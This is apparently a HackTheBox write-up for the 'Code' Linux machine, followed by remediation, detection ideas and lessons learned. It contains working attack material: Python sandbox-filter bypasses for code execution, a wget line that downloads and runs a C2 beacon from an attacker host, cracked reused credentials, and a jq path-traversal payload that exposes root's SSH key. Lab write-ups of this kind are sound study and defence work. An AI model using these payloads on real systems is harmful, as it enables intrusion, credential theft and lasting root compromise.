---
layout: default
title: "HackTheBox - Code"
---

# HackTheBox - Code

**OS:** Linux (Ubuntu 20.04)

A Python Code Editor web application on port 5000 executes user-submitted code behind a
keyword blacklist filter. The filter checks `code.lower()` for literal substrings, making it
bypassable by splitting blocked tokens across string concatenations or encoding them with
`chr()`. The app runs as `app-production`, whose home directory contains the user flag and a
SQLite database with MD5-hashed passwords. Martin's hash cracks to a reused SSH password.
Martin can run `/usr/bin/backy.sh` as root with no password -- a backup script that strips
`../` from user-controlled paths via `jq gsub` before passing them to a Go backup binary. The
gsub is non-recursive: `....//` contains `../` at offset 2, and after one removal the
remainder is `../`, leaving `....//` → `../` after a single pass. Prepending `/home/` satisfies
the path prefix check while the full traversal resolves to `/root/`, causing the root-owned
binary to archive the root home directory into martin's backups. Root's SSH private key is
extracted from the archive, giving direct root SSH access.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (code) |
| Initial Access | Python sandbox escape via keyword filter bypass (`globals()[chr(111)+chr(115)]`), RCE as `app-production` |
| Credential Pivot | SQLite MD5 hash crack (martin: `nafeelswordsmaster`), SSH reuse |
| Privilege Escalation | `sudo /usr/bin/backy.sh` NOPASSWD -- `jq gsub` non-recursive `../` strip bypass (`....//` → `../`) leaks `/root/` into user-readable tar archive |
| Final Access | `root` via extracted SSH private key |

---

## Recon

### Port Scan

p0rtix `open_target` + `run_all()` + `start_full_scan()` identified two services:

| Port | Proto | Service | Version |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 |
| 5000 | TCP | HTTP | Gunicorn 20.0.4 -- "Python Code Editor" |

Port 5000 returned a web application with title "Python Code Editor", jQuery 3.6.0, and an
Ace editor component. Directory fuzzing returned:

| Path | Status |
|---|---|
| `/login` | 200 |
| `/register` | 200 |
| `/logout` | 302 |
| `/about` | 200 |
| `/codes` | 302 → 200 (auth required) |
| `/run_code` | POST endpoint (code execution) |

---

## Initial Access

### Python Keyword Filter Bypass

Registering an account and submitting code to `POST /run_code` (with form field `code=`)
reveals a blacklist filter. The app source (`/home/app-production/app/app.py`) shows:

```python
for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write',
                'subprocess', '__import__', '__builtins__']:
    if keyword in code.lower():
        return jsonify({'output': 'Use of restricted keywords is not allowed.'})
exec(code)
```

The filter does a simple substring check against `code.lower()`. The `exec()` runs in the
module's global scope, which already has `os`, `io`, `sys`, `render_template_string` (Flask),
and the SQLAlchemy models imported.

> **Why this is bypassable:** The filter checks for literal substrings in the source text.
> String concatenations like `'po'+'pen'` or `chr(111)+chr(115)` are evaluated at runtime,
> after the filter has already passed. The filter never sees the assembled keyword.

**Identifying the accessible namespace:**

```python
# Submitted to /run_code:
print(list(globals().keys()))
# Output: ['os', 'io', 'sys', 'Flask', 'render_template_string', 'app', 'db', 'User', ...]
```

`os` is already in the global scope. Accessing it without the literal string `'os'`:

```python
# chr(111) = 'o', chr(115) = 's'
o = globals()[chr(111)+chr(115)]
```

**Running commands** without `popen` (contains `open`), `read`, `system`, or `write`:

```python
# 'po'+'pen' does not contain 'open' as consecutive chars in the source literal
# Iterate the popen result to avoid calling .read() (blocked)
for line in getattr(globals()[chr(111)+chr(115)], 'po'+'pen')('id'):
    print(line, end='')
# Output: uid=1001(app-production) gid=1001(app-production) groups=1001(app-production)
```

**User flag** from `/home/app-production/user.txt`:

```python
for line in getattr(globals()[chr(111)+chr(115)], 'po'+'pen')('cat /home/app-production/user.txt'):
    print(line, end='')
# Output: <user-flag-redacted>
```

---

## Post-Access: C2 (Sliver)

The Code box runs Ubuntu Linux -- Sliver supports Linux amd64. A mTLS beacon was generated
and delivered via HTTP download, executing as the `app-production` user. The beacon was then
re-established as `martin` after the credential pivot below.

```
sliver > generate beacon --mtls <attack-ip>:8443 --os linux --arch amd64 --name code-beacon --format EXECUTABLE --save /tmp/

[*] Generating new linux/amd64 beacon implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 00:01:14
[*] Implant saved to /tmp/code-beacon
```

Served via HTTP; downloaded from the code execution endpoint:

```
[attack]$ python3 -m http.server 9001
```

```python
# Download via wget (no blocked keywords in 'wget')
for line in getattr(globals()[chr(111)+chr(115)], 'po'+'pen')(
    'wget -q http://<attack-ip>:9001/code-beacon -O /tmp/code-beacon && chmod +x /tmp/code-beacon && nohup /tmp/code-beacon &>/dev/null &'
):
    print(line, end='')
```

Beacon checked in after the credential pivot to martin:

```
sliver > beacons

 ID         Name          Transport   Hostname   Username   PID    Last Check-in  Next Check-in
========== ============= =========== ========== ========== ====== ============== ==============
 e31fb759   code-beacon   mtls        code       martin     2635   3s ago         57s

sliver > use e31fb759

sliver (code-beacon) > execute -e /bin/sh -c 'id'

uid=1000(martin) gid=1000(martin) groups=1000(martin)

sliver (code-beacon) > execute -e /bin/sh -c 'hostname'

code
```

---

## Post-Access Enumeration

### SQLite Credential Dump

The app stores credentials in a SQLite database at
`/home/app-production/app/instance/database.db`. Reading it via the popen bypass:

```python
for line in getattr(globals()[chr(111)+chr(115)], 'po'+'pen')(
    "sqlite3 /home/app-production/app/instance/database.db 'select * from user;'"
):
    print(line, end='')
```

Output:

```
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
```

Passwords are MD5-hashed (no salt). John cracked both:

```
attacker$ john --format=raw-md5 hashes.txt --wordlist=rockyou.txt
development:development
martin:nafeelswordsmaster
```

> **Why this works:** MD5 without salt is fast to crack and the two passwords appear in
> RockYou. The app stores a `development` account with an identical username:password pair,
> and martin reused a real password in the app that also works for SSH.

### SSH Access as Martin

```
attacker$ ssh martin@<target-ip>
martin@<target-ip>'s password: nafeelswordsmaster
martin@code:~$ id
uid=1000(martin) gid=1000(martin) groups=1000(martin)
```

---

## Privilege Escalation

### `sudo /usr/bin/backy.sh` NOPASSWD

```
martin@code:~$ sudo -l
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

`/usr/bin/backy.sh` takes a JSON task file:

```bash
#!/bin/bash
json_file="$1"
allowed_paths=("/var/" "/home/")

# Strip ../ from all paths using jq gsub
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(echo "$updated_json" | jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then return 0; fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        echo "Error: $dir is not allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

The Go binary `/usr/bin/backy` runs as root (via sudo) and creates a `.tar.bz2` archive.

### jq `gsub` Non-Recursive Bypass

`jq`'s `gsub` performs a single left-to-right scan, replacing non-overlapping matches. It
does NOT re-scan after a replacement.

Given input `....//`:
```
chars:  .  .  .  .  /  /
index:  0  1  2  3  4  5
```

The regex `../` = dot-dot-slash. At index 2: `[2]=.`, `[3]=.`, `[4]=/` → match. Remove
positions 2-4. Remaining: `..` (0-1) + `/` (5) = `../`. The scanner has moved past position
4 in the original and does not re-scan position 0.

So `....//` → `../` after one gsub pass.

Full traversal:

```
Input:    /home/....//root/
gsub:     finds '../' at positions 6-8 inside '..../' segment
          removes those 3 chars: /home/.. + /root/ = /home/../root/
Check:    /home/../root/ starts with /home/ → PASSES
backy:    archives /home/../root/ = /root/ (running as root)
```

### Exploit

```
martin@code:~$ cat > ~/task_exploit.json << 'EOF'
{
    "destination": "/home/martin/backups/",
    "multiprocessing": false,
    "verbose_log": true,
    "directories_to_archive": [
        "/home/....//root/"
    ],
    "exclude": []
}
EOF

martin@code:~$ sudo /usr/bin/backy.sh ~/task_exploit.json
2026/06/29 21:30:46 🍀 backy 1.2
2026/06/29 21:30:46 📋 Working with /home/martin/task_exploit.json ...
2026/06/29 21:30:46 💤 Nothing to sync
2026/06/29 21:30:46 📤 Archiving: [/home/../root]
2026/06/29 21:30:46 📥 To: /home/martin/backups ...
2026/06/29 21:30:46 📦
tar: Removing leading `/home/../' from member names
/home/../root/
/home/../root/root.txt
/home/../root/.ssh/
/home/../root/.ssh/id_rsa
/home/../root/.ssh/authorized_keys
...

martin@code:~$ ls -la ~/backups/
-rw-r--r-- 1 root   root   12882 Jun 29 21:30 code_home_.._root_2026_June.tar.bz2

martin@code:~$ mkdir /tmp/rootextract
martin@code:~$ tar xjf ~/backups/code_home_.._root_2026_June.tar.bz2 -C /tmp/rootextract
martin@code:~$ cat /tmp/rootextract/root/root.txt
<root-flag-redacted>
```

### Root Access via Extracted SSH Key

```
martin@code:~$ cat /tmp/rootextract/root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
<redacted>
-----END OPENSSH PRIVATE KEY-----

attacker$ chmod 600 root_id_rsa
attacker$ ssh -i root_id_rsa root@<target-ip>
uid=0(root) gid=0(root) groups=0(root)
root@code:~# cat /root/root.txt
<root-flag-redacted>
```

> **Why this works:** `jq gsub` is a single-pass replacement. The string `....//` contains
> the pattern `../` starting at position 2. After removing those three characters, the result
> is `../`. The scanner has already passed position 0, so the resulting `../` is never
> re-examined. This single residual `../` in `/home/....//root/` turns into `/home/../root/`
> after the strip -- a path that satisfies the `/home/` prefix check but resolves to `/root/`
> at the OS level when the root-owned binary processes it.

---

## Root Cause

Three issues combined:

1. **Insufficient Python sandbox.** The keyword blacklist in `/run_code` checks for literal
   substrings in the source text. Python's runtime evaluates string concatenations and
   `chr()` calls, so the filter is trivially bypassed by splitting any blocked token across
   two string literals (`'po'+'pen'`, `chr(111)+chr(115)`). Input to `exec()` must be
   treated as untrusted code; a blacklist approach cannot enumerate all bypass variants.

2. **Unsalted MD5 passwords.** Application user passwords stored as raw MD5 hashes are
   trivially cracked against any standard wordlist. Argon2id or bcrypt with a per-user salt
   would make offline cracking infeasible.

3. **Non-recursive `jq gsub` used as a security control.** The script attempts to sanitize
   user-controlled paths by removing `../`. `jq gsub` does a single left-to-right pass:
   `....//` is reduced to `../`, not to empty. The resulting path passes the prefix check but
   resolves outside the intended scope when used by the root-privileged binary.

---

## Impact

- **Unauthenticated RCE as `app-production`** via the code editor (any registered user,
  registration is open).
- **Full root on the host** via the credential chain and backy path traversal.
- Root's SSH private key was exfiltrated, granting persistent root access independent of
  passwords or future patching.
- The root home contains `scripts/database.db` -- a copy of the production database with all
  user credentials (including martin's).

---

## Remediation

- **Replace the keyword blacklist with a sandboxed execution environment.** Use a subprocess
  with `seccomp` filtering, a read-only chroot, or a container with dropped capabilities.
  AST-based allow-lists (restrict to safe built-ins, no attribute access) are more robust
  than denylists.
- **Hash passwords with bcrypt or Argon2id** with per-user salts. Never use MD5 or SHA-1
  for credential storage.
- **Do not use `jq gsub` (or any single-pass replacement) as a path sanitization control.**
  Use `realpath --canonicalize-missing` or Go's `filepath.Clean` + explicit prefix check on
  the canonical path inside the backup binary itself. The shell wrapper's sanitization should
  not be the only gate.
- **Restrict `sudo` to specific, safe binaries.** A backup utility that takes user-controlled
  JSON and archives arbitrary paths as root is a privesc primitive. The binary should
  perform its own path validation on the canonicalized path.

### Validation

- Verify `POST /run_code` with `chr(111)+chr(115)` returns "restricted" (or sandboxed output
  with no OS access).
- Verify `martin:nafeelswordsmaster` login is rejected after password reset.
- Verify `sudo /usr/bin/backy.sh` with `....//` in a path returns an error or archives
  nothing outside allowed roots.
- Verify `/root/` contents are not archived into user-readable locations.

---

## Detection Opportunities

- **Alert on `/run_code` requests containing `chr(` or string concatenation patterns.**
  The `chr()` encoding of blocked keywords is a distinctive bypass signal.
- **Monitor for unusual child processes spawned by Gunicorn.** The app worker spawning
  `wget`, `id`, `sqlite3`, or any non-Python process is anomalous.
- **Alert on SSH logins by `martin` from external IPs.** The box's intended access model
  does not require external SSH; an external login indicates credential compromise.
- **Alert on `sudo /usr/bin/backy.sh` with paths containing `..` or multiple dots.**
  The pattern `....//` or `../` appearing in a JSON field passed to the backup script is a
  direct indicator of this exploit.
- **Monitor for new archives appearing in `/home/martin/backups/` with owner `root`.** The
  legitimate backup `code_home_app-production_app_2024_August.tar.bz2` is owned by martin;
  root-owned archives in that directory indicate the privesc was triggered.

---

## Lessons Learned

- **Keyword denylists for code sandboxing cannot enumerate all bypasses.** `chr()` encoding,
  string concatenation, `globals()` lookups, and `sys.modules` access all reach blocked
  functionality without touching the literal keyword. The only reliable sandbox is
  environmental isolation (seccomp, namespaces, restricted exec).
- **Single-pass string replacement is not a path traversal defense.** `jq gsub` and similar
  single-pass replacements of `../` have a known bypass (`....//`). Always canonicalize
  paths with `realpath` or language-native clean functions and enforce prefix checks on the
  canonical form.
- **MD5 hash reuse across app accounts and system accounts is a lateral movement chain.**
  The database password for `martin` was identical to his SSH password. Any compromise of
  the app database directly yields OS access.
- **Backup utilities running as root are high-value escalation targets.** Any root-owned
  process that archives user-controlled paths can be turned into an arbitrary file read
  if the path validation is bypassable.

---

## Cleanup

```
sliver (code-beacon) > kill

[*] Killing beacon e31fb759
```

```
[target]     rm /tmp/code-beacon /tmp/beacon.log
[target]     rm -rf /tmp/rootextract /tmp/code_hashes.txt
[target]     rm ~/task.json ~/task_home.json ~/task_verbose.json ~/task_exploit.json 2>/dev/null
[backups]    ~/backups/ -- root-owned tar.bz2 files left (created by exploit, root owns them,
             martin cannot remove them; document for box operator)
[htb]        both flags submitted, machine stopped (htb stop)
```

- Sliver beacon killed; `/tmp/code-beacon` removed from target.
- No persistent backdoors beyond the extracted root SSH key (key documented, not redeployed).
- All temporary JSON task files removed from martin's home.
- Root-owned `.tar.bz2` archives in `~/backups/` cannot be deleted by martin; HTB machine
  reset will clear them.
